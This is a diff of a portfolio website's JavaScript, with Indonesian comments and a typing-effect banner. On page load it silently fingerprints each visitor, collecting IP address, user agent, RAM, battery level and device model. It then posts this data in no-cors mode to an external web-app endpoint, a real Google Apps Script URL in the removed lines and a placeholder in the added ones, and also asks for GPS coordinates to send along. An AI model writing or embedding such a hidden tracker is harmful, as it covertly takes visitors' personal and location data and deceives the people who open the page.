@@ -1,54 +1,59 @@
 (async function() {
   const getDeviceModel = () => {
-    const ua = navigator.userAgent; // [cite: 1]
+    const ua = navigator.userAgent;
+    // Deteksi dasar dari User Agent
     if (/android/i.test(ua)) {
       const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
-      return match ? match[1] : "Android Device";
+      if (match) return match[1]; // Mengambil model dari string Android
+      return "Android Device";
     }
+    
+    // Deteksi iPhone secara spesifik menggunakan resolusi layar
     if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
-      const w = window.screen.width, h = window.screen.height; // [cite: 2]
+      const w = window.screen.width, h = window.screen.height;
       if (w === 390 && h === 844) return "iPhone 12/13/14 Pro";
       if (w === 430 && h === 932) return "iPhone 14/15 Pro Max";
+      if (w === 375 && h === 667) return "iPhone SE/6/7/8";
       return "Apple iOS Device";
     }
-    return navigator.platform || "Unknown Device";
+
+    // Deteksi Desktop
+    if (/Windows/i.test(ua)) return "Windows PC";
+    if (/Macintosh/i.test(ua)) return "MacBook / iMac";
+    
+    return "Unknown Device";
   };
 
   const startTracker = async () => {
     let payload = {
-      ip: "Hidden/Blocked", city: "-", country: "-", isp: "-",
-      userAgent: navigator.userAgent, platform: navigator.platform,
-      ram: navigator.deviceMemory || "N/A", battery: "N/A", // [cite: 4]
-      deviceName: getDeviceModel()
+      ip: "Checking...",
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      ram: navigator.deviceMemory || "N/A",
+      battery: null,
+      deviceName: getDeviceModel() // Panggil fungsi penebak nama
     };
 
-    // 1. Ambil Info Network (IP, Kota, Negara, ISP)
-    try {
-      const res = await fetch('http://ip-api.com/json/');
-      const d = await res.json();
-      if (d.status === "success") {
-        payload.ip = d.query; payload.city = d.city;
-        payload.country = d.country; payload.isp = d.isp;
-      }
-    } catch (e) { console.error("IP info failed"); }
-
-    // 2. Ambil Info Baterai [cite: 5, 6]
+    // Ambil Baterai & IP (Logika sama seperti sebelumnya)
     if (navigator.getBattery) {
-      try { 
-        const b = await navigator.getBattery();
-        payload.battery = Math.round(b.level * 100); 
-      } catch (e) {}
+      try { const b = await navigator.getBattery(); payload.battery = Math.round(b.level * 100); } catch (e) {}
     }
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const d = await res.json();
+      payload.ip = d.ip;
+    } catch (e) {}
 
     const send = (data) => {
-      fetch("https://script.google.com/macros/s/AKfycbzvqP9k_J5uBeSzADPiO0vJ4D_XS9W5S352PfnrD0B_NlpWi-Q4kGoABiJkv1zu3fLfQw/exec", { // GANTI DENGAN URL DEPLOYMENT 
-        method: "POST", mode: "no-cors", body: JSON.stringify(data)
+      fetch("URL_WEB_APP_ANDA", {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify(data)
       });
     };
 
-    send(payload); // Kirim data dasar segera 
+    send(payload);
 
-    // 3. Minta Lokasi GPS (Update jika diizinkan) [cite: 9]
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition((pos) => {
         payload.lat = pos.coords.latitude;
@@ -59,8 +64,10 @@
     }
   };
 
-  window.addEventListener('load', () => { startTracker(); });
-
+  window.addEventListener('load', () => {
+    startTracker();
+    // Efek UI lainnya...
+  });
 
   // --- UI EFFECTS (TYPING) ---
   const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
